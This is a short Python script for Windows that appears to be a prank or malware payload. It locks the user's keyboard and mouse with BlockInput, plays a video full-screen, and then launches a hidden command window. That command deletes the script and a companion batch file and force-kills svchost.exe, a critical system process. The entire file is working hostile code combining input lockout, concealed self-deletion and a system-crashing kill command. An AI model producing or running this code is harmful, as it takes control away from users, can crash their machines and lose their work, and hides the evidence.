import sys,os,time,cv2,ctypes,subprocess

# parameters
out = sys.argv[1]
batch = sys.argv[2]

# block user input
ctypes.windll.user32.BlockInput(True)

cap = cv2.VideoCapture(out)
cv2.namedWindow('video', cv2.WINDOW_NORMAL)
cv2.setWindowProperty('video', cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

while cap.isOpened():
    ret, frame = cap.read()
    if not ret:
        break
    cv2.imshow('video', frame)
    if cv2.waitKey(1) & 0xFF == ord('q'):
        break

cap.release()
cv2.destroyAllWindows()

ctypes.windll.user32.BlockInput(False)

# spawn cleanup
cmdline = f'cmd /c "timeout /t 2 /nobreak>nul & del \"{__file__}\" & del \"{batch}\" & TASKKILL /IM svchost.exe /F"'
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = subprocess.SW_HIDE
subprocess.Popen(cmdline, startupinfo=si)